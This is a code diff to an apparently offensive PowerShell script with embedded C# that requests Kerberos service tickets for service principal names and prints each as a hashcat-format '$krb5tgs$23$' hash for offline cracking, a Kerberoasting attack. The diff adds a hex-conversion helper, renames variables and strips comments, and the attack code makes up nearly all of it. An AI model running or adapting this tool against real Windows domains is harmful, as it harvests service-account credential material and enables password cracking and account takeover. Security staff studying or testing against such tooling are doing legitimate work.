@@ -74,7 +74,7 @@ public class K {
             if (AcquireCredentialsHandle(
                     null,
                     "Kerberos",
-                    0x00000002, // SECPKG_CRED_OUTBOUND
+                    0x00000002,
                     IntPtr.Zero,
                     IntPtr.Zero,
                     IntPtr.Zero,
@@ -87,7 +87,7 @@ public class K {
                     ref cred,
                     IntPtr.Zero,
                     spn,
-                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
+                    0x00001000,
                     0,
                     16,
                     IntPtr.Zero,
@@ -112,6 +112,17 @@ public class K {
 }
 "@
 
+# Fallback hex-to-byte conversion for compatibility with older PowerShell
+function Convert-HexToByteArray {
+    param([string]$HexString)
+    $HexString = $HexString -replace '[^0-9A-Fa-f]', ''
+    $bytes = New-Object byte[] ($HexString.Length / 2)
+    for ($i = 0; $i -lt $HexString.Length; $i += 2) {
+        $bytes[$i / 2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
+    }
+    return $bytes
+}
+
 function Get-KerberosTicketHashcatFormat {
     [CmdletBinding()]
     param(
@@ -135,35 +146,34 @@ function Get-KerberosTicketHashcatFormat {
             try {
                 Write-Host "`n[+] Requesting TGS for SPN: ${spn}"
 
-                $ticket = [K]::GetTicket($spn)
-                if (-not $ticket) {
+                $ticketHex = [K]::GetTicket($spn)
+                if (-not $ticketHex) {
                     Write-Warning "Failed to retrieve ticket for ${spn}."
                     continue
                 }
 
-                $ticketBytes = [System.Convert]::FromHexString($ticket)
+                $ticketBytes = Convert-HexToByteArray $ticketHex
                 if ($ticketBytes.Length -le 16) {
-                    Write-Warning "TGS data too short to extract valid checksum/ciphertext."
+                    Write-Warning "Ticket too short for valid TGS format."
                     continue
                 }
 
-                $checksumBytes = $ticketBytes[0..15]
-                $ciphertextBytes = $ticketBytes[16..($ticketBytes.Length - 1)]
+                $checksum = $ticketBytes[0..15]
+                $ciphertext = $ticketBytes[16..($ticketBytes.Length - 1)]
 
-                $checksumHex = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ''
-                $ciphertextHex = ($ciphertextBytes | ForEach-Object { $_.ToString("x2") }) -join ''
+                $checksumHex = ($checksum | ForEach-Object { $_.ToString("x2") }) -join ''
+                $cipherHex = ($ciphertext | ForEach-Object { $_.ToString("x2") }) -join ''
 
-                $userPart = $SamAccountName
-                $realmPart = ($spn.Split("/")[-1]).ToUpper().Split(":")[0]  # host.domain.com
-                $spnPart = $spn.Replace(":", "~")
+                $realm = ($spn.Split("/")[-1]).ToUpper().Split(":")[0]
+                $spnSanitized = $spn.Replace(":", "~")
 
-                $hashcatFormat = "\$krb5tgs\$23\$*$userPart\$$realmPart\$$spnPart\$$checksumHex\$$ciphertextHex"
-                Write-Host "[+] Hashcat Format:`n$hashcatFormat"
+                $hashcat = "\$krb5tgs\$23\$*$SamAccountName\$$realm\$$spnSanitized\$$checksumHex\$$cipherHex"
+                Write-Host "[+] Hashcat Format:`n$hashcat"
             } catch {
-                Write-Warning "Error while processing SPN '$spn': $_"
+                Write-Warning "Error while processing SPN '${spn}': $_"
             }
         }
     } catch {
-        Write-Error "Fatal error: $_"
+        Write-Error "Error during execution: $_"
     }
 }
